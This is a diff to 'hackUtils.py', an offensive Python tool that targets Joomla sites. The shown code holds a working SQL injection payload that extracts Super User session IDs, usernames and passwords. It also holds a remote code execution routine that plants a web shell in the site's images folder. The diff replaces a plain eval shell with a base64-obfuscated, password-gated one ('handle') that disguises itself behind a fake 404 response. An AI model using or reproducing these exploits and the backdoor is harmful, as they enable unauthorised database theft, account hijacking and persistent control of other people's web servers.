@@ -2,7 +2,7 @@
 
 #*******************************#
 # Description: Hack Utils       #
-# Author: avfisher#wooyun.org   #
+# Author: avfisher#avfisher.win #
 # Email: security_alert@126.com #
 #*******************************#
 
@@ -348,7 +348,7 @@ def checkJoomlaSQLi(url):
     poc = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select 0x6176666973686572),floor(rand(0)*2))x from information_schema.tables group by x)a)"
     urlA=url+poc
     try:
-        result = requests.get(urlA,timeout=30,allow_redirects=True,verify=False).content
+        result = requests.get(urlA,timeout=10,allow_redirects=True,verify=False).content
         if 'avfisher' in result:
             username = getInfoByJoomlaSQLi(url, 'username')
             password = getInfoByJoomlaSQLi(url, 'password')
@@ -373,7 +373,7 @@ def getInfoByJoomlaSQLi(url, param):
         payload = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(session_id)) FROM %23__session WHERE data LIKE '%Super User%' AND data NOT LIKE '%IS NOT NULL%' AND userid!='0' AND username IS NOT NULL LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
     urlA=url+payload
     try:
-	result = requests.get(urlA,timeout=30,allow_redirects=True,verify=False).content
+	result = requests.get(urlA,timeout=10,allow_redirects=True,verify=False).content
         if "Duplicate entry '" in result:
 	    reg = ".*Duplicate entry \'(.*?)1\'.*"
 	elif "Duplicate entry &#039" in result:	
@@ -387,7 +387,7 @@ def getInfoByJoomlaSQLi(url, param):
 
 def rceJoomla(value):
     now = time.strftime('%H:%M:%S',time.localtime(time.time()))
-    print "["+str(now)+"] [INFO] Checking Joomla 1.5 - 3.4.5 Remote Command Execute..."
+    print "["+str(now)+"] [INFO] Checking Joomla 1.5 - 3.4.5 Remote Code Execution..."
     if 'http://' in value or 'https://' in value:
     	url=value
     	checkJoomlaRCE(url)
@@ -404,6 +404,10 @@ def rceJoomla(value):
 
 def checkJoomlaRCE(url):    
     url = url.strip()
+    reg = 'http[s]*://.*/$'
+    m = re.match(reg,url)
+    if not m:
+        url = url + "/"
     poc = generate_payload("phpinfo();")
     try:
         result = get_url(url, poc)
@@ -426,7 +430,7 @@ def get_url(url, user_agent):
     }
     cookies = requests.get(url,headers=headers).cookies
     for _ in range(3):
-        response = requests.get(url, timeout=30, headers=headers,cookies=cookies)    
+        response = requests.get(url, timeout=10, headers=headers, cookies=cookies)    
     return response.content
    
 def php_str_noquotes(data):
@@ -467,8 +471,8 @@ def getShellByJoomlaRCE(url, system, script_filename):
             shell = script_filename.split('index.php')[0].replace('/','//').strip()+"images//1ndex.php"
         else:
             shell = script_filename.split('index.php')[0]+"images/1ndex.php"
-        yijuhua = "<?php eval($_POST[1]);?>"
-        cmd ="file_put_contents('"+shell+"','"+yijuhua+"');"
+        #yijuhua = "<?php eval($_POST[1]);?>" 
+        cmd ="file_put_contents('"+shell+"',base64_decode('PD9waHAgaWYoISRfUE9TVFsnaGFuZGxlJ10pe2hlYWRlcignSFRUUC8xLjEgNDA0IE5vdCBGb3VuZCcpOyBleGl0KCk7IH1lbHNleyAkcz0icCIuInIiLiJlIi4iZyIuIl8iLiJyIi4iZSIuInAiLiJsIi4iYSIuImMiLiJlIjsgJHMoIn5bZGlzY3V6XX5lIiwkX1BPU1RbJ2hhbmRsZSddLCJBY2Nlc3MiKTsgfSA/Pg=='));"
         pl = generate_payload(cmd)
         try:
             get_url(url, pl)
@@ -480,8 +484,8 @@ def getShellByJoomlaRCE(url, system, script_filename):
     
 def myhelp():
     print "\n+-----------------------------+"
-    print "|  hackUtils v0.0.1           |"
-    print "|  Avfisher - Wooyun.org      |"
+    print "|  hackUtils v0.0.2           |"
+    print "|  Avfisher - avfisher.win    |"
     print "|  security_alert@126.com     |"
     print "+-----------------------------+\n"
     print "Usage: hackUtils.py [options]\n"
@@ -491,7 +495,7 @@ def myhelp():
     print "  -g keyword, --google=keyword                        Fetch URLs from Google based on specific keyword"
     print "  -w keyword, --wooyun=keyword                        Fetch URLs from Wooyun Corps based on specific keyword"
     print "  -j url|file, --joomla=url|file                      Exploit SQLi for Joomla 3.2 - 3.4"
-    print "  -r url|file, --rce=url|file                         Exploit Remote Command Execute for Joomla 1.5 - 3.4.5"
+    print "  -r url|file, --rce=url|file                         Exploit Remote Code Execution for Joomla 1.5 - 3.4.5 (Password: handle)"
     print "  -d site, --domain=site                              Scan subdomains based on specific site"
     print "  -e string, --encrypt=string                         Encrypt string based on specific encryption algorithms (e.g. base64, md5, sha1, sha256, etc.)"
     print "\nExamples:"
